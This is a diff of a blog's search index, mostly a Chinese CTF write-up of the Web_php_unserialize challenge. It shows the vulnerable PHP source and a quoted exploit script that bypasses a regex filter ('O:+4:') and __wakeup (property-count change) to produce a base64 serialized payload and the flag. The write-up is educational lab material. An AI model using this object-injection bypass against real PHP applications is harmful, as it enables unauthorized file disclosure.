@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title></title>
+    <title>Web_php_unserialize wp</title>
     <url>/2022/01/15/Web_php_unserialize/</url>
     <content><![CDATA[<h3 id="攻防世界-Web-php-unserialize-wp"><a href="#攻防世界-Web-php-unserialize-wp" class="headerlink" title="攻防世界:Web_php_unserialize wp"></a>攻防世界:Web_php_unserialize wp</h3><p>由题可知道，该题为php反序列化漏洞。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -15,17 +15,24 @@
 
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_match():正则匹配模式，匹配var变量中是否有 [oc]:\d+:</span><br><span class="line">我们需要明白OC匹配模式的规则</span><br><span class="line">正则表达式：是指一个用来描述或者匹配一系列符合某个句法规则的字符串的单个字符串，简单说，就是我们写个模板，然后去匹配字符串。</span><br></pre></td></tr></table></figure>
 
-<p><img src="Web_php_unserialize.assets/image-20220115020435213.png" alt="image-20220115020435213"></p>
+<p><img src="/2022/01/15/Web_php_unserialize/image-20220115141748577.png" alt="image-20220115141748577"></p>
 <p>附匹配规则表</p>
-<p>第12行可知，flag很可能在fl4g.php中<img src="Web_php_unserialize.assets/image-20220115010045830.png" alt="image-20220115010045830" style="zoom:50%;" /></p>
+<p>第12行可知，flag很可能在fl4g.php中<img src="/2022/01/15/Web_php_unserialize/image-20220115141815743.png" alt="image-20220115141815743" style="zoom:50%;"></p>
 <p>添加/fl4g.php 网页空白。<br>其实是在Demo类中，执行了wakeup()，使得file强制赋值为了index.php.</p>
 <p>我们需要GET请求var值绕过preg_match和wakeup()。</p>
-<p><img src="Web_php_unserialize.assets/image-20220115014622417.png" alt="image-20220115014622417"></p>
+<p><img src="/2022/01/15/Web_php_unserialize/image-20220115014622417.png" alt="image-20220115014622417"></p>
 <p>我们可以利用CVE-2016漏洞跳过wakeup()</p>
 <p>由于本人毫无写php的基础。因此附上网上wp的php脚本进行分析</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">      <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">      <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个对象,并且创建对象时，自动且先调用了__construct函数，</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);<span class="comment">//把$file赋值为&#x27;fl4g.php&#x27;</span></span><br><span class="line"><span class="comment">#进行序列化</span></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="comment">#使用str_replace() 函数进行替换，来绕过正则表达式的检查</span></span><br><span class="line"><span class="comment">#  /[oc]:\d+:/i   意思为，在var中匹配 &quot;o(或者c或者oc):%d:&quot; 若匹配成功则不返回0.</span></span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;O:4:&#x27;</span>,<span class="string">&#x27;O:+4:&#x27;</span>,<span class="variable">$a</span>);<span class="comment">//讲4改为+4 使得匹配不到 o:4:</span></span><br><span class="line"><span class="comment">#使用str_replace() 函数进行替换，来绕过__wakeup()魔法函数</span></span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#再进行base64编码,输出的结果为flag</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#扔到在线编译器结果为</span></span><br><span class="line">TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br><span class="line">   <span class="comment">#获得flag</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>反序列化漏洞</tag>
+      </tags>
   </entry>
   <entry>
     <title>欢迎来到我的博客</title>
@@ -37,13 +44,5 @@
         <tag>首次</tag>
         <tag>测试</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>gosumemory（直播端PP显示器）的简易使用</title>
-    <url>/2022/01/14/gosumemory/</url>
-    <content><![CDATA[<p> <a href="https://www.bilibili.com/video/BV1DU4y1775d">视频说明</a>：<br> <a href="https://github.com/l3lackShark/gosumemory/releases">项目链接</a>：<br>点击项目链接，下载</p>
-<!--- more -->
-
-]]></content>
   </entry>
 </search>
